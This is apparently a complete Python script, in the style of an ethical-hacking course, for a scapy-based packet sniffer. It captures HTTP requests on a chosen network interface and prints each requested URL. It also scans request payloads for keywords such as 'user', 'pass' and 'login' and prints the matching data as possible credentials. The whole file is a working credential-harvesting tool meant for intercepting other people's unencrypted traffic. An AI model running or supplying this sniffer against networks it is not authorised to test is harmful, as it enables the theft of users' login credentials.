#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


class PacketSniffer:
    def sniff(self, interface):
        print("\n=> Waiting for web requests...")
        # prn= : [callback function] use output in different function (process_packets)
        scapy.sniff(iface=interface, store=False, prn=self.process_packets)

    def get_url(self, packet):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        return url

    def get_login_info(self, packet):
        if packet.haslayer(scapy.Raw):  # Filter "Raw" layer from "http-request" packet
            # Filter "load" field from "Raw" layer
            load_data = packet[scapy.Raw].load
            # Converted byte type to str using "decode()" function
            load_data = load_data.decode(encoding='latin-1')
            keywords = ["user", "uname", "pass", "pwd", "login"]
            for keyword in keywords:
                if str.lower(keyword) in str.lower(load_data):
                    return load_data

    def process_packets(self, packet):
        if packet.haslayer(http.HTTPRequest):  # Filters "http-request" packets
            url = self.get_url(packet)
            # Converts "byte" type to "str" using "decode()" function
            print(f"\nRequested URL >> : {url.decode(encoding='latin-1')}")

            login_info = self.get_login_info(packet)
            if login_info:
                print(f"\n\nPossible creds >> : {login_info}\n\n")

    def start(self):
        iface = input("Enter the interface to sniff : ")
        self.sniff(iface)

